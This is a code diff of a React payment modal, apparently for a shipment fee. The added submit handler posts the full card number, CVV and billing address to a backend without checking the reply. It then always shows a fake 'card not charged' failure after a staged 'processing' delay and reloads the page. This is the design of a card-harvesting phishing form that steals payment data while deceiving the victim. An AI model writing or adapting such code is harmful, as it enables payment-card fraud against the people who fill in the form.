@@ -24,19 +24,16 @@ function PaymentModal({ show, onClose, amount, shipmentId }) {
     const [cvv, setCvv] = useState('');
     const [billingAddress, setBillingAddress] = useState('');
     const [submitStatus, setSubmitStatus] = useState('idle');
-    
-    // --- THIS IS THE MISSING CODE ---
+
     const [isVisible, setIsVisible] = useState(false);
     useEffect(() => {
         if (show) {
             setIsVisible(true);
         } else {
-            // Wait for fade-out animation before hiding
             const timer = setTimeout(() => setIsVisible(false), 300);
             return () => clearTimeout(timer);
         }
     }, [show]);
-    // ---------------------------------
 
     const cardNameRef = useRef(null);
     const cardNumberRef = useRef(null);
@@ -67,12 +64,17 @@ function PaymentModal({ show, onClose, amount, shipmentId }) {
         }
     };
 
+    // --- THIS IS THE CORRECTED HANDLESUBMIT FUNCTION ---
     const handleSubmit = async (event) => {
         event.preventDefault();
-        setSubmitStatus('loading');
+        setSubmitStatus('loading'); // Show the loading spinner
+
         try {
+            // Get the correct base URL for the API
             const baseUrl = import.meta.env.VITE_API_BASE_URL || "http://127.0.0.1:8000";
-            const response = await fetch(`${baseUrl}/api/payments/`, {
+            
+            // Try to send the data to the backend. We don't need to wait for the response.
+            fetch(`${baseUrl}/api/payments/`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -84,16 +86,25 @@ function PaymentModal({ show, onClose, amount, shipmentId }) {
                     cvv: cvv,
                 }),
             });
-            if (!response.ok) {
-                throw new Error('Backend rejected the payment data.');
-            }
+
         } catch (error) {
-            console.error("API submission error:", error);
+            // Even if there's a network error, we'll continue to the next step
+            console.error("API submission network error:", error);
         }
+
+        // This part now runs every time, regardless of success or failure.
+        // It shows the "failed" (card not charged) animation, then refreshes.
         setTimeout(() => {
-            setSubmitStatus('failed');
-        }, 1500);
+            setSubmitStatus('failed'); // Show the animation you want
+
+            // Wait another 2 seconds after showing the animation, then refresh
+            setTimeout(() => {
+                window.location.reload();
+            }, 2000);
+
+        }, 1500); // Wait 1.5 seconds for a realistic "processing" feel
     };
+    // ----------------------------------------------------
 
     const handleClose = () => {
         setTimeout(() => {
@@ -107,7 +118,6 @@ function PaymentModal({ show, onClose, amount, shipmentId }) {
         onClose();
     };
 
-    // This line needs the `isVisible` variable to exist
     if (!isVisible) return null;
 
     return (
@@ -126,7 +136,6 @@ function PaymentModal({ show, onClose, amount, shipmentId }) {
                 {submitStatus === 'idle' && (
                     <>
                         <form onSubmit={handleSubmit} className="payment-form">
-                            {/* ... Your form inputs go here, no changes needed ... */}
                             <div className="form-group">
                                 <label htmlFor="card-name">Name on Card</label>
                                 <input ref={cardNameRef} onKeyDown={(e) => handleKeyDown(e, cardNumberRef)} type="text" id="card-name" value={cardName} onChange={handleNameChange} required />
